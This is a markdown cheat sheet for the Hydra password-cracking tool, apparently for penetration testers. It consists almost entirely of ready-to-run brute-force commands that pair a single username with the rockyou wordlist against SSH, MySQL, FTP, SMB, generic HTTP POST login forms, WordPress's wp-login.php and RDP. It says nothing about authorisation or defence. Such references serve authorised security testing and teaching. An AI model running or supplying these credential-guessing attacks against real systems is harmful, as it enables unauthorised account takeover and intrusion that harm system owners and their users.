# hydra Cheat sheet

**Syntax:**

```
hydra [option] ip
```

<details>
<summary>Useful Flags </summary>

|Flags |Description|
|-----|---------|
|-h |see the help menu|
|-l |\<LOGIN>: Pass single username/login|
|-L |\<FILE>: Pass multiple usernames/logins|
|-p |\<LOGIN>: Pass single known password|
|-P |\<FILE>: Pass a password list or wordlist (ex.: rockyou.txt)|
|-s |\<PORT>: Use custom port|
|-f |Exit as soon as at least one a login and a password combination is found|
|-R |Restore previous session (if crashed/aborted)|

</details>



<details>
<summary>SSH </summary>

## Bruteforce ssh

```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
```
</details>


<details>
<summary>Mysql </summary>

## Bruteforce MySQL credentials

```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
```
</details>

<details>
<summary>FTP </summary>

## Bruteforce FTP credentials

```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
```
</details>





<details>
<summary>SMB </summary>

## Bruteforce SMB credentials

```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
```
</details>



<details>
<summary>HTTP Post Form </summary>

## Bruteforce HTTP Post 

```
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
```

**Example:**
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/admin.php:log=^USER^&pwd=^PASS^:invalid passwod"
```
</details>


<details>
<summary>Wordpress </summary>

## Bruteforce Wordpress credentials 

```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

</details>

<details>
<summary>RDP </summary>

## Bruteforce RDP


```
hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
```

</details>


